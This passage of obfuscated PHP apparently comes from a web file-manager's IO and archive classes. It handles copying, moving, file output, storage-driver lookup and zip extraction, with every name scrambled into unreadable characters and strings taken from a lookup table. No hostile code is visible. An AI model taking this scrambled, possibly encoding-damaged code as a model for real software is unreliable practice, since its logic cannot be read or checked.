IO::errorTips($‚õÕıı[1199] . $³‚‡ú±µ . $‚õÕıı[70] . $—œÔ¹•÷); } } self::copyMoveKeepInfo($ş˜ú×¢Ã, $³‚‡ú±µ, $ãÎÒøˆ); return $ãÎÒøˆ; } private static function copyFile($ò†š—Ä, $š£ğ½“, $ñáÃæ÷¨, $çØ÷Ş‚², $Ü½û–å», $œòÈ›”ø) { $·ÁÆ¼Ôç =& $_SERVER[³½¬ÚË¯]; $çØ÷Ş‚² = $ñáÃæ÷¨->getPath(rtrim($çØ÷Ş‚², $·ÁÆ¼Ôç[8]) . $·ÁÆ¼Ôç[8] . $Ü½û–å»); $  Í¯‚ş = $·ÁÆ¼Ôç[1200] . time() . rand_string(5); Hook::trigger($·ÁÆ¼Ôç[1201], $ò†š—Ä, $š£ğ½“, $ñáÃæ÷¨, $çØ÷Ş‚², $Ü½û–å», $  Í¯‚ş); if (self::driverIsSame($ò†š—Ä, $ñáÃæ÷¨)) { if ($œòÈ›”ø) { $ºïî¯³ó = $ñáÃæ÷¨->moveFile($š£ğ½“, $çØ÷Ş‚²); } else { $ºïî¯³ó = $ñáÃæ÷¨->copyFile($š£ğ½“, $çØ÷Ş‚²); } Hook::trigger($·ÁÆ¼Ôç[1202], $ò†š—Ä, $š£ğ½“, $ñáÃæ÷¨, $çØ÷Ş‚², $Ü½û–å», $ºïî¯³ó); self::copyMoveKeepInfo($ò†š—Ä, $š£ğ½“, $ºïî¯³ó); return $ºïî¯³ó; } $²éÕ¡ÈŒ = TEMP_FILES; if ($GLOBALS[$·ÁÆ¼Ôç[6]][$·ÁÆ¼Ôç[89]][$·ÁÆ¼Ôç[832]]) { $²éÕ¡ÈŒ = $GLOBALS[$·ÁÆ¼Ôç[6]][$·ÁÆ¼Ôç[89]][$·ÁÆ¼Ôç[832]]; } $¯õ—“Å = $²éÕ¡ÈŒ; mk_dir($¯õ—“Å); $µï¥Æ…Ø = $¯õ—“Å . $  Í¯‚ş; $»ö ¼û = $µï¥Æ…Ø; $µï¥Æ…Ø = $ò†š—Ä->download($š£ğ½“, $µï¥Æ…Ø); $µï¥Æ…Ø = $ò†š—Ä->iconvApp($µï¥Æ…Ø); if (substr($µï¥Æ…Ø, strlen($²éÕ¡ÈŒ)) == $²éÕ¡ÈŒ) { $œòÈ›”ø = !0; } $ºïî¯³ó = $ñáÃæ÷¨->upload($çØ÷Ş‚², $µï¥Æ…Ø, $œòÈ›”ø); self::remove($»ö ¼û); Hook::trigger($·ÁÆ¼Ôç[1202], $ò†š—Ä, $š£ğ½“, $ñáÃæ÷¨, $çØ÷Ş‚², $Ü½û–å», $ºïî¯³ó); self::copyMoveKeepInfo($ò†š—Ä, $š£ğ½“, $ºïî¯³ó); return $ºïî¯³ó; } private static function copyMoveKeepInfo($ßÅ—Š“×, $È¶’¡ƒ, $À“Éõ­ò) { if (!$À“Éõ­ò) { return; } $„…Ù¬µ = $ßÅ—Š“×->info($È¶’¡ƒ); if (!is_array($„…Ù¬µ)) { return; } IO::setModifyTime($À“Éõ­ò, $„…Ù¬µ[$_SERVER[³½¬ÚË¯][85]]); } public static function pathFather($ŠéŒÎºÓ) { $ş¸£åÓ™ = IO::init($ŠéŒÎºÓ); $¾ø‘›É = $ş¸£åÓ™->pathFather($ş¸£åÓ™->path); return $ş¸£åÓ™->getPathOuter($¾ø‘›É); } public static function fileOut($˜Ú‚´Ÿˆ, $ÅõªÅ¯¾ = false, $áÀš©ÑŒ = false, $ÌŒâš” = '') { $ÄÌõŸ¿ò = self::driverMake($˜Ú‚´Ÿˆ); if ($ÄÌõŸ¿ò->isFileOutServer()) { return $ÄÌõŸ¿ò->fileOutServer($˜Ú‚´Ÿˆ, $ÅõªÅ¯¾, $áÀš©ÑŒ, $ÌŒâš”); } return $ÄÌõŸ¿ò->fileOut($˜Ú‚´Ÿˆ, $ÅõªÅ¯¾, $áÀš©ÑŒ, $ÌŒâš”); } public static function fileOutImage($èÇ×üÈñ, $¤÷¦ÃË¼ = 250) { $æ—š¯Ë = array(250, 600, 1200, 2000, 3000, 5000); for ($€š†¼×´ = 0; $€š†¼×´ < count($æ—š¯Ë); $€š†¼×´++) { if ($€š†¼×´ == 0 && $¤÷¦ÃË¼ <= $æ—š¯Ë[$€š†¼×´]) { $¤÷¦ÃË¼ = $æ—š¯Ë[$€š†¼×´]; break; } else { if ($¤÷¦ÃË¼ > $æ—š¯Ë[$€š†¼×´ - 1] && $¤÷¦ÃË¼ <= $æ—š¯Ë[$€š†¼×´]) { $¤÷¦ÃË¼ = $æ—š¯Ë[$€š†¼×´]; break; } else { if ($€š†¼×´ == count($æ—š¯Ë) - 1 && $¤÷¦ÃË¼ > $æ—š¯Ë[$€š†¼×´]) { $¤÷¦ÃË¼ = $æ—š¯Ë[$€š†¼×´]; break; } } } } $î÷©ª‡Õ = self::driverMake($èÇ×üÈñ); if ($î÷©ª‡Õ->isFileOutServer()) { return $î÷©ª‡Õ->fileOutImageServer($èÇ×üÈñ, $¤÷¦ÃË¼); } return $î÷©ª‡Õ->fileOutImage($èÇ×üÈñ, $¤÷¦ÃË¼); } private static function driverIsSame($éïè¿Ñ, $áİĞ) { $Ê¼Ö˜¾µ =& $_SERVER[³½¬ÚË¯]; $ß‘ØŠ« = $éïè¿Ñ->getType(); $¤–‡ˆ¦ó = $áİĞ->getType(); if ($ß‘ØŠ« != $¤–‡ˆ¦ó) { return !1; } if ($ß‘ØŠ« == $Ê¼Ö˜¾µ[793]) { return !0; } if ($ß‘ØŠ« == $Ê¼Ö˜¾µ[106]) { return !0; } if ($éïè¿Ñ->pathDriver == $áİĞ->pathDriver) { return !0; } return !1; } public static function copyUpdate($İ©Ğ›àÀ, $–‡ˆı’±) { $ğÄ‚ı‚… =& $_SERVER[³½¬ÚË¯]; if (!IO::exist($İ©Ğ›àÀ)) { return !1; } if (!IO::exist($–‡ˆı’±)) { IO::mkdir($–‡ˆı’±); } $Ó™ºò‘ = array_to_keyvalue(self::listAllSimple($İ©Ğ›àÀ), $ğÄ‚ı‚…[84]); $¾Ùº†¤ = array_to_keyvalue(self::listAllSimple($–‡ˆı’±), $ğÄ‚ı‚…[84]); $ì²¼×ØÄ = array(); $é»˜Š¡ = array(); foreach ($Ó™ºò‘ as $ÜşŠª => $¼­åÕá) { if (isset($¾Ùº†¤[$ÜşŠª])) { if ($¼­åÕá[$ğÄ‚ı‚…[75]] == 1) { continue; } if ($¾Ùº†¤[$ÜşŠª][$ğÄ‚ı‚…[76]] == $¼­åÕá[$ğÄ‚ı‚…[76]]) { continue; } } if ($¼­åÕá[$ğÄ‚ı‚…[75]] == 1) { $é»˜Š¡[] = $–‡ˆı’± . $ğÄ‚ı‚…[8] . trim($ÜşŠª, $ğÄ‚ı‚…[8]); continue; } $ü®¡ÈÀ = strstr(trim($ÜşŠª, $ğÄ‚ı‚…[8]), $ğÄ‚ı‚…[8]) ? get_path_father($ÜşŠª) : $ğÄ‚ı‚…[12]; $ì²¼×ØÄ[] = array($ğÄ‚ı‚…[1203] => $¼­åÕá[$ğÄ‚ı‚…[86]], $ğÄ‚ı‚…[1204] => rtrim($–‡ˆı’±, $ğÄ‚ı‚…[8]) . $ğÄ‚ı‚…[8] . $ü®¡ÈÀ, $ğÄ‚ı‚…[1205] => $¼­åÕá); } $¸£´²¢ = array($ğÄ‚ı‚…[214] => $ì²¼×ØÄ, $ğÄ‚ı‚…[75] => $é»˜Š¡); Hook::trigger($ğÄ‚ı‚…[1206], $İ©Ğ›àÀ, $–‡ˆı’±, $¸£´²¢); foreach ($é»˜Š¡ as $¼­åÕá) { IO::mkdir($¼­åÕá); } foreach ($ì²¼×ØÄ as $¼­åÕá) { IO::copy($¼­åÕá[$ğÄ‚ı‚…[1203]], $¼­åÕá[$ğÄ‚ı‚…[1204]], REPEAT_REPLACE); } } public static function fileSubstr($­Ñ¬áÖ, $—œ¬Ÿ˜À, $ĞŸ×Ùå = false) { $Òåõƒæ =& $_SERVER[³½¬ÚË¯]; $°ÍìÛá² = self::driverMake($­Ñ¬áÖ); $›ÊÍíƒ = $°ÍìÛá²->size($­Ñ¬áÖ); $‹Ãôûëû = $—œ¬Ÿ˜À; $ ½‰ğ¥¨ = $ĞŸ×Ùå; if ($—œ¬Ÿ˜À < 0) { $—œ¬Ÿ˜À = $›ÊÍíƒ + $—œ¬Ÿ˜À; } if ($ĞŸ×Ùå === !1) { $ĞŸ×Ùå = $›ÊÍíƒ - $—œ¬Ÿ˜À; } if ($—œ¬Ÿ˜À + $ĞŸ×Ùå > $›ÊÍíƒ) { $ĞŸ×Ùå = $›ÊÍíƒ - $—œ¬Ÿ˜À; } if (!$›ÊÍíƒ && $°ÍìÛá²->getType() == $Òåõƒæ[106] && !$°ÍìÛá²->exist($­Ñ¬áÖ)) { $‚”­†÷¹ = get_path_this($­Ñ¬áÖ); $Ä±¶èÉ® = parse_url_query($‚”­†÷¹); if (is_array($Ä±¶èÉ®) && isset($Ä±¶èÉ®[$Òåõƒæ[32]])) { $‚”­†÷¹ = urldecode($Ä±¶èÉ®[$Òåõƒæ[32]]); } throw new Exception($Òåõƒæ[1207] . LNG($Òåõƒæ[1208]) . $Òåõƒæ[1009] . clear_html($‚”­†÷¹) . $Òåõƒæ[12]); } if ($ĞŸ×Ùå <= 0) { return $Òåõƒæ[12]; } if ($—œ¬Ÿ˜À < 0 || $—œ¬Ÿ˜À >= $›ÊÍíƒ || $ĞŸ×Ùå > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\x65\122\x65\x61\x64\x20\145\162\162\x6f\x72\x21\x20\163\164\141\162\x74\x3d{$—œ¬Ÿ˜À}\x3b\x6c\145\156\147\164\150\x3d{$ĞŸ×Ùå}\x3b\40\x73\151\172\145\x3d{$›ÊÍíƒ}\x3b"); } $€€«ş×ò = $°ÍìÛá²->fileSubstr($­Ñ¬áÖ, $—œ¬Ÿ˜À, $ĞŸ×Ùå); if (!$€€«ş×ò && $ĞŸ×Ùå && isset($GLOBALS[$Òåõƒæ[1209]])) { throw new Exception($GLOBALS[$Òåõƒæ[1209]][$Òåõƒæ[1210]]); } return $€€«ş×ò; } private static function driverMake(&$¼òØà†) { $ìÀ´“Á =& $_SERVER[³½¬ÚË¯]; $½Í‚öó = KodIO::parse($¼òØà†); if (!self::$driverListSystem) { $Î»öı = Model($ìÀ´“Á[803])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Î»öı, $ìÀ´“Á[443]); } if ($½Í‚öó[$ìÀ´“Á[33]] == KodIO::KOD_IO && !self::$driverListSystem[$½Í‚öó[$ìÀ´“Á[443]]]) { return !1; } $¼òØà† = $½Í‚öó[$ìÀ´“Á[1211]]; $ĞçŠÀ = self::driverGet($½Í‚öó, $¼òØà†); return $ĞçŠÀ; } private static function driverGet($á¥ˆá£, &$Ø¼òØÅ) { $ü„çå˜Ù =& $_SERVER[³½¬ÚË¯]; $À†ß¿ú = $á¥ˆá£[$ü„çå˜Ù[1212]]; $èŠ¡¨ç  = $á¥ˆá£[$ü„çå˜Ù[443]]; switch ($á¥ˆá£[$ü„çå˜Ù[33]]) { case KodIO::KOD_IO: $œ¶¯¤¸Ø = self::$driverListSystem[$èŠ¡¨ç ]; break; case KodIO::KOD_SOURCE: $Ø¼òØÅ = $èŠ¡¨ç  . $Ø¼òØÅ; $œ¶¯¤¸Ø = array($ü„çå˜Ù[1213] => $ü„çå˜Ù[1214], $ü„çå˜Ù[6] => $á¥ˆá£); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÒîıæÈ = $GLOBALS[$ü„çå˜Ù[1215]]; self::$driverListUser = array_to_keyvalue($ÒîıæÈ, $ü„çå˜Ù[443]); } $œ¶¯¤¸Ø = self::$driverListUser[$èŠ¡¨ç ]; break; case KodIO::KOD_SHARE_LINK: $œ¶¯¤¸Ø = array($ü„çå˜Ù[1213] => $ü„çå˜Ù[1216], $ü„çå˜Ù[6] => $á¥ˆá£); $™Ñ¹×¾Ñ = Action($ü„çå˜Ù[1217])->sharePathInfo($á¥ˆá£[$ü„çå˜Ù[84]]); $Ø¼òØÅ = $™Ñ¹×¾Ñ[$ü„çå˜Ù[181]]; if (!$™Ñ¹×¾Ñ[$ü„çå˜Ù[181]]) { $¾¶ª‰¥è = Model($ü„çå˜Ù[633])->getInfo($™Ñ¹×¾Ñ[$ü„çå˜Ù[634]]); $Ø¼òØÅ = KodIO::clear($¾¶ª‰¥è[$ü„çå˜Ù[1218]] . $á¥ˆá£[$ü„çå˜Ù[1211]]); $á¥ˆá£[$ü„çå˜Ù[529]] = $¾¶ª‰¥è; $á¥ˆá£[$ü„çå˜Ù[1194]] = $Ø¼òØÅ; $œ¶¯¤¸Ø = array($ü„çå˜Ù[1213] => $ü„çå˜Ù[1219], $ü„çå˜Ù[6] => $á¥ˆá£); } break; case KodIO::KOD_SHARE_ITEM: $œ¶¯¤¸Ø = array($ü„çå˜Ù[1213] => $ü„çå˜Ù[1220], $ü„çå˜Ù[6] => $á¥ˆá£); $¾¶ª‰¥è = Model($ü„çå˜Ù[633])->getInfo($á¥ˆá£[$ü„çå˜Ù[443]]); if ($¾¶ª‰¥è[$ü„çå˜Ù[181]] == $ü„çå˜Ù[212]) { $Ø¼òØÅ = KodIO::clear($¾¶ª‰¥è[$ü„çå˜Ù[1218]] . $á¥ˆá£[$ü„çå˜Ù[1211]]); $á¥ˆá£[$ü„çå˜Ù[529]] = $¾¶ª‰¥è; $á¥ˆá£[$ü„çå˜Ù[1194]] = $Ø¼òØÅ; $œ¶¯¤¸Ø = array($ü„çå˜Ù[1213] => $ü„çå˜Ù[1221], $ü„çå˜Ù[6] => $á¥ˆá£); } else { if (!$Ø¼òØÅ) { $Ø¼òØÅ = $¾¶ª‰¥è[$ü„çå˜Ù[181]]; } } break; default: $Ø¼òØÅ = $á¥ˆá£[$ü„çå˜Ù[84]]; $œ¶¯¤¸Ø = array($ü„çå˜Ù[1213] => $ü„çå˜Ù[1222]); break; } $àÕ¥ãşË = $á¥ˆá£[$ü„çå˜Ù[84]]; if (!isset(self::$driverCache[$àÕ¥ãşË])) { $Ğ©§ù¨ = strtolower($œ¶¯¤¸Ø[$ü„çå˜Ù[95]]); $Ëı òš… = $GLOBALS[$ü„çå˜Ù[6]][$ü„çå˜Ù[89]][$ü„çå˜Ù[862]]; $İıØ¼ê† = $ü„çå˜Ù[74] . (isset($Ëı òš…[$Ğ©§ù¨]) ? $Ëı òš…[$Ğ©§ù¨] : ucfirst($Ğ©§ù¨)); if (!class_exists($İıØ¼ê†)) { show_json("{$İıØ¼ê†}\40\156\157\x74\x20\x65\x78\x69\x73\x74\163\41", !1); } $‚âõØíÆ = isset($œ¶¯¤¸Ø[$ü„çå˜Ù[6]]) ? $œ¶¯¤¸Ø[$ü„çå˜Ù[6]] : !1; self::$driverCache[$àÕ¥ãşË] = new $İıØ¼ê†($‚âõØíÆ); } $Ïüøôú = self::$driverCache[$àÕ¥ãşË]; $Ïüøôú->pathDriver = $À†ß¿ú; $Ïüøôú->pathBase = $ü„çå˜Ù[12]; if (isset($œ¶¯¤¸Ø[$ü„çå˜Ù[6]][$ü„çå˜Ù[1223]])) { $Ïüøôú->pathBase = rtrim($œ¶¯¤¸Ø[$ü„çå˜Ù[6]][$ü„çå˜Ù[1223]], $ü„çå˜Ù[8]) . $ü„çå˜Ù[8]; $Ø¼òØÅ = $Ïüøôú->pathBase . ltrim($Ø¼òØÅ, $ü„çå˜Ù[8]); } $Ø¼òØÅ = $Ïüøôú->getPath($Ø¼òØÅ); if (isset($á¥ˆá£[$ü„çå˜Ù[1194]])) { $Ø¼òØÅ = $á¥ˆá£[$ü„çå˜Ù[1194]]; } $Ïüøôú->path = $Ø¼òØÅ; return $Ïüøôú; } public static function errorTips($¿Ëí‰ì… = false) { $şÜ¬ÙÕõ =& $_SERVER[³½¬ÚË¯]; static $«ÄÓÎ×„ = array(); $ÍÀñæÆú = 1000; if ($¿Ëí‰ì… === -1) { return $«ÄÓÎ×„ ? $«ÄÓÎ×„[count($«ÄÓÎ×„) - 1] : $şÜ¬ÙÕõ[12]; } if ($¿Ëí‰ì… === !1) { return implode($şÜ¬ÙÕõ[246], $«ÄÓÎ×„); } if (count($«ÄÓÎ×„) >= $ÍÀñæÆú) { $«ÄÓÎ×„ = array_slice($«ÄÓÎ×„, $ÍÀñæÆú * 0.5, $ÍÀñæÆú); } $«ÄÓÎ×„[] = $¿Ëí‰ì…; write_log($şÜ¬ÙÕõ[163] . ACTION . $şÜ¬ÙÕõ[1224] . $¿Ëí‰ì…, $şÜ¬ÙÕõ[1225]); } public static function getLastError($§ø½¹´ = '') { $—Úø’½¨ = self::errorTips(-1); return $—Úø’½¨ ? $—Úø’½¨ : $§ø½¹´; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Æäâ÷­; if ($Æäâ÷­) { return $Æäâ÷­; } $¶·ÛùÜ› = IO::init($_SERVER[³½¬ÚË¯][8]); return $¶·ÛùÜ›; } private static function iconvSystem($ ×Í¯ª) { return self::local()->iconvSystem($ ×Í¯ª); } private static function iconvApp($Üã§”¨) { return self::local()->iconvApp($Üã§”¨); } public static function zipFolder($İÆŒâ¡Ú, $¶ãæìÕç = "\x7a\151\x70", $Ô¬ù¾‘  = '', $òøÜèëŞ = REPEAT_RENAME) { $«€™Ÿ˜î =& $_SERVER[³½¬ÚË¯]; $†¤ÌÚ’™ = IO::listPath($İÆŒâ¡Ú); if (!$†¤ÌÚ’™) { return !1; } $†¤ÌÚ’™ = array_merge($†¤ÌÚ’™[$«€™Ÿ˜î[82]], $†¤ÌÚ’™[$«€™Ÿ˜î[83]]); return self::zip($†¤ÌÚ’™, $¶ãæìÕç, $Ô¬ù¾‘ , $òøÜèëŞ); } public static function zip($ ûÌ›¥”, $¨Ù›Ò—Ã = "\x7a\151\x70", $Ñç“¿¦ç = '', $ñ³ÈÖ©Á = REPEAT_RENAME) { $ºŠü´äè =& $_SERVER[³½¬ÚË¯]; if (is_string($ ûÌ›¥”) && $ ûÌ›¥”) { $ ûÌ›¥” = array(array($ºŠü´äè[84] => $ ûÌ›¥”)); } $æ«ŒÏ = self::init($ ûÌ›¥”[0][$ºŠü´äè[84]]); $ŸËšß¸ = self::info($ ûÌ›¥”[0][$ºŠü´äè[84]]); $ŞŠÆØ‚Ã = $ºŠü´äè[12]; $§Œ¨ªŸ = $ºŠü´äè[12]; $ÉØ§áÃ  = $ºŠü´äè[12]; if ($Ñç“¿¦ç && substr($Ñç“¿¦ç, -1, 1) != $ºŠü´äè[8]) { $§Œ¨ªŸ = get_path_father($Ñç“¿¦ç); $ÉØ§áÃ  = get_path_this($Ñç“¿¦ç); } else { $§Œ¨ªŸ = self::pathFather($ŸËšß¸[$ºŠü´äè[84]]); $ÉØ§áÃ  = $ŸËšß¸[$ºŠü´äè[32]] . $ºŠü´äè[10] . $¨Ù›Ò—Ã; if (count($ ûÌ›¥”) > 1) { $„„»ú‚¢ = IO::info($§Œ¨ªŸ); $ÉØ§áÃ  = $„„»ú‚¢[$ºŠü´äè[32]] . $ºŠü´äè[10] . $¨Ù›Ò—Ã; } if ($Ñç“¿¦ç) { $§Œ¨ªŸ = $Ñç“¿¦ç; } } if ($æ«ŒÏ->getType() == $ºŠü´äè[106]) { $Ì˜½ÃÁñ = self::init($§Œ¨ªŸ); $Ö°œñÙ³ = $Ì˜½ÃÁñ->getType() == $ºŠü´äè[106] ? $§Œ¨ªŸ : get_path_father($æ«ŒÏ->path); $Ö°œñÙ³ = rtrim($Ö°œñÙ³, $ºŠü´äè[8]) . $ºŠü´äè[8]; mk_dir($Ö°œñÙ³); } else { $ŞŠÆØ‚Ã = TEMP_FILES . $ºŠü´äè[1226] . time() . rand_string(8) . $ºŠü´äè[8]; mk_dir($ŞŠÆØ‚Ã); file_put_contents($ŞŠÆØ‚Ã . $ºŠü´äè[1227], $ºŠü´äè[12]); $Ö°œñÙ³ = $ŞŠÆØ‚Ã; } $çßàŠª¨ = IO::info($Ö°œñÙ³); if (!$çßàŠª¨ || !$çßàŠª¨[$ºŠü´äè[217]]) { show_json(LNG($ºŠü´äè[1228]), !1); } $¬™Ş™• = self::zipFileList($ ûÌ›¥”, $ŞŠÆØ‚Ã); foreach ($¬™Ş™• as $ÓÕ«Ü¤ï => $¿Å¢óŞ) { $¬™Ş™•[$ÓÕ«Ü¤ï] = self::iconvSystem($¿Å¢óŞ); } $â™ ÓĞå = get_filename_auto($Ö°œñÙ³ . $ÉØ§áÃ , $ºŠü´äè[12], $ñ³ÈÖ©Á); KodArchive::create(self::iconvSystem($â™ ÓĞå), $¬™Ş™•); if (!IO::exist($â™ ÓĞå)) { if ($ŞŠÆØ‚Ã) { del_dir($ŞŠÆØ‚Ã); } show_json(LNG($ºŠü´äè[1229]), !1); } if (!$ŞŠÆØ‚Ã) { return $â™ ÓĞå; } $®­ÜŠ¥ = self::move($â™ ÓĞå, $§Œ¨ªŸ, $ñ³ÈÖ©Á); if ($ŞŠÆØ‚Ã) { del_dir($ŞŠÆØ‚Ã); } if (!$â™ ÓĞå) { show_json(LNG($ºŠü´äè[1229]), !1); } return $®­ÜŠ¥; } public static function unzip($¾­Ç‰ğ, $ƒ¹œ®ñ, $å¡šâ½Ë = "\55\x31", $øÍ°ï¼¥ = "\x72\145\160\x6c\141\143\x65") { $øÑÔòÖÂ =& $_SERVER[³½¬ÚË¯]; $¹®ÇĞ = parent::info($¾­Ç‰ğ); if (!$¹®ÇĞ) { show_json(LNG($øÑÔòÖÂ[1230]), !1); } $ŸÚÀˆé• = IO::infoFullSimple($ƒ¹œ®ñ); if (!$ŸÚÀˆé•) { $ƒ¹œ®ñ = IO::mkdir($ƒ¹œ®ñ); } if (isset($ŸÚÀˆé•[$øÑÔòÖÂ[181]]) && trim($ŸÚÀˆé•[$øÑÔòÖÂ[84]], $øÑÔòÖÂ[8]) != trim($ƒ¹œ®ñ, $øÑÔòÖÂ[8])) { $”Š‚òœÍ = KodIO::make($ŸÚÀˆé•[$øÑÔòÖÂ[180]]); $ÆÀïî‰ = IO::fileNameAuto($”Š‚òœÍ, $ŸÚÀˆé•[$øÑÔòÖÂ[32]], REPEAT_RENAME_FOLDER, !0); $ƒ¹œ®ñ = IO::mkdir($”Š‚òœÍ . $ÆÀïî‰); } $å¡šâ½Ë = $å¡šâ½Ë && $å¡šâ½Ë != $øÑÔòÖÂ[1231] ? @json_decode($å¡šâ½Ë, !0) : -1; $³¨ÑÔÊ­ = self::unzipPart($¾­Ç‰ğ, $å¡šâ½Ë); if (!$³¨ÑÔÊ­ || !IO::exist($³¨ÑÔÊ­[$øÑÔòÖÂ[214]])) { show_json(LNG($øÑÔòÖÂ[105]), !1); } $ïÑÕ­á = $³¨ÑÔÊ­[$øÑÔòÖÂ[1232]][count($³¨ÑÔÊ­[$øÑÔòÖÂ[1232]]) - 1]; if ($ïÑÕ­á[$øÑÔòÖÂ[1233]] == -1 || substr($ïÑÕ­á[$øÑÔòÖÂ[32]], -1, 1) == $øÑÔòÖÂ[8]) { $²ğ£ˆÚ  = $³¨ÑÔÊ­[$øÑÔòÖÂ[1234]] . rand_string(10) . $øÑÔòÖÂ[8]; mk_dir($²ğ£ˆÚ ); $Ç÷øµÍ£ = count($³¨ÑÔÊ­[$øÑÔòÖÂ[1232]]) == 1 ? IO::ext($¾­Ç‰ğ) : get_path_ext($³¨ÑÔÊ­[$øÑÔòÖÂ[214]]); $œåòÈïé = KodArchive::extract(self::iconvSystem($³¨ÑÔÊ­[$øÑÔòÖÂ[214]]), $²ğ£ˆÚ , $ïÑÕ­á[$øÑÔòÖÂ[1233]], $ÆÀïî‰, $Ç÷øµÍ£); self::unzipErrorCheck($œåòÈïé, array($øÑÔòÖÂ[1235], $¾­Ç‰ğ, $Ç÷øµÍ£, $ƒ¹œ®ñ, $³¨ÑÔÊ­)); Hook::trigger($øÑÔòÖÂ[1236], $²ğ£ˆÚ ); recursion_dir($²ğ£ˆÚ , $£”«ƒÑ, $âìÒéµù, 0); $ïŸú×ö = array_merge($£”«ƒÑ, $âìÒéµù); $ à„ÄÓ = array(); foreach ($ïŸú×ö as $ß¹Âİß) { $»ğÜ©Ë = IO::move(self::iconvApp($ß¹Âİß), $ƒ¹œ®ñ, $øÍ°ï¼¥); if ($»ğÜ©Ë) { $ à„ÄÓ[] = $»ğÜ©Ë; } } del_dir($²ğ£ˆÚ ); } else { $»ğÜ©Ë = IO::move($³¨ÑÔÊ­[$øÑÔòÖÂ[214]], $ƒ¹œ®ñ, $øÍ°ï¼¥, get_path_this($ïÑÕ­á[$øÑÔòÖÂ[32]])); if ($»ğÜ©Ë) { $ à„ÄÓ[] = $»ğÜ©Ë; } } return $ à„ÄÓ ? $ à„ÄÓ : !1; } public static function unzipList($¾úæÇ¯²) { $šÎÏã‚Ì =& $_SERVER[³½¬ÚË¯]; $İ²Ë• = isset($¾úæÇ¯²[$šÎÏã‚Ì[1237]]) ? $¾úæÇ¯²[$šÎÏã‚Ì[1237]] : !1; $ş»İÕşÌ = isset($¾úæÇ¯²[$šÎÏã‚Ì[1233]]) ? @json_decode($¾úæÇ¯²[$šÎÏã‚Ì[1233]], !0) : -1; $¾ÒÁ“Î¡ = self::unzipPart($¾úæÇ¯²[$šÎÏã‚Ì[84]], $ş»İÕşÌ); if (!$¾ÒÁ“Î¡ || !IO::exist($¾ÒÁ“Î¡[$šÎÏã‚Ì[214]])) { show_json(LNG($šÎÏã‚Ì[105]), !1); } $³æ×£Æ = $¾ÒÁ“Î¡[$šÎÏã‚Ì[1232]][count($¾ÒÁ“Î¡[$šÎÏã‚Ì[1232]]) - 1]; $Ç¦Ôöà¼ = in_array(IO::ext($¾ÒÁ“Î¡[$šÎÏã‚Ì[214]]), array($šÎÏã‚Ì[357], $šÎÏã‚Ì[1238], $šÎÏã‚Ì[1239], $šÎÏã‚Ì[1240], $šÎÏã‚Ì[1241], $šÎÏã‚Ì[1242])); if (!$İ²Ë• && ($³æ×£Æ[$šÎÏã‚Ì[1233]] == -1 || $Ç¦Ôöà¼)) { $ì—ÅÃ™ä = $¾ÒÁ“Î¡[$šÎÏã‚Ì[1234]] . get_path_this($¾ÒÁ“Î¡[$šÎÏã‚Ì[214]]) . $šÎÏã‚Ì[1243]; if (!IO::exist($ì—ÅÃ™ä)) { $ºÁÄŒÉö = $³æ×£Æ[$šÎÏã‚Ì[1233]] == -1 ? get_path_ext(IO::pathThis($¾úæÇ¯²[$šÎÏã‚Ì[84]])) : get_path_ext($¾ÒÁ“Î¡[$šÎÏã‚Ì[214]]); $Ñ…Óäøœ = KodArchive::listContent(self::iconvSystem($¾ÒÁ“Î¡[$šÎÏã‚Ì[214]]), !0, $ºÁÄŒÉö); self::unzipErrorCheck($Ñ…Óäøœ, array($šÎÏã‚Ì[1244], $¾úæÇ¯², $¾ÒÁ“Î¡)); @file_put_contents($ì—ÅÃ™ä, json_encode($Ñ…Óäøœ[$šÎÏã‚Ì[1245]])); } return @json_decode(IO::getContent($ì—ÅÃ™ä), !0); } IO::fileOut($¾ÒÁ“Î¡[$šÎÏã‚Ì[214]], $İ²Ë•, get_path_this($³æ×£Æ[$šÎÏã‚Ì[32]])); die; } private static function zipFileList($œÕ•ÒŞ¯, $†ÁÎÙÀÏ = false) { $†¦õ‰³Õ =& $_SERVER[³½¬ÚË¯]; $Ò¬‡´‚ = array(); foreach ($œÕ•ÒŞ¯ as $®³ŞãëŠ) { $º†­ºÀ« = $®³ŞãëŠ[$†¦õ‰³Õ[84]]; if ($†ÁÎÙÀÏ) { $º†­ºÀ« = self::copy($®³ŞãëŠ[$†¦õ‰³Õ[84]], $†ÁÎÙÀÏ, $†¦õ‰³Õ[854]); } else { $©‡ÁùÛÒ = self::init($®³ŞãëŠ[$†¦õ‰³Õ[84]]); if ($©‡ÁùÛÒ->getType() == $†¦õ‰³Õ[106]) { $º†­ºÀ« = $©‡ÁùÛÒ->path; } } if ($º†­ºÀ« && self::local()->exist($º†­ºÀ«)) { $Ò¬‡´‚[$®³ŞãëŠ[$†¦õ‰³Õ[84]]] = $º†­ºÀ«; } } if (!empty($Ò¬‡´‚)) { return array_values($Ò¬‡´‚); } show_json(LNG($†¦õ‰³Õ[1208]), !1); } private static function localFilePath($ŸÉº—ÈÕ) { $Ğ¥â°ç÷ =& $_SERVER[³½¬ÚË¯]; $ÄŒÙ±šñ = KodIO::parse($ŸÉº—ÈÕ); if ($ÄŒÙ±šñ[$Ğ¥â°ç÷[33]] == KodIO::KOD_SOURCE) { $Å‹ñ†ºÃ = Model($Ğ¥â°ç÷[861])->fileInfoGet(KodIO::sourceID($ŸÉº—ÈÕ)); if (!$Å‹ñ†ºÃ[$Ğ¥â°ç÷[84]]) { show_json($Ğ¥â°ç÷[1246], !1); } $ŸÉº—ÈÕ = $Å‹ñ†ºÃ[$Ğ¥â°ç÷[84]]; } $†Íñµ¨… = self::init($ŸÉº—ÈÕ); if ($†Íñµ¨…->pathParse[$Ğ¥â°ç÷[1194]]) { $ŸÉº—ÈÕ = $†Íñµ¨…->pathParse[$Ğ¥â°ç÷[1194]]; $†Íñµ¨… = self::init($ŸÉº—ÈÕ); } $èßŸœèÜ = $†Íñµ¨…->getType(); if ($èßŸœèÜ == $Ğ¥â°ç÷[106] || $èßŸœèÜ == $Ğ¥â°ç÷[1247]) { if (!$†Íñµ¨…->exist($†Íñµ¨…->path)) { show_json(LNG($Ğ¥â°ç÷[105]), !1); } return $†Íñµ¨…->path; } return !1; } public static function unzipPart($Ï¦âåæ, $£ìµ£ó = -1) { $áæñ‡¯ï =& $_SERVER[³½¬ÚË¯]; $âµëÜ“Û = IO::pathThis($Ï¦âåæ); if (!$£ìµ£ó || $£ìµ£ó == -1) { 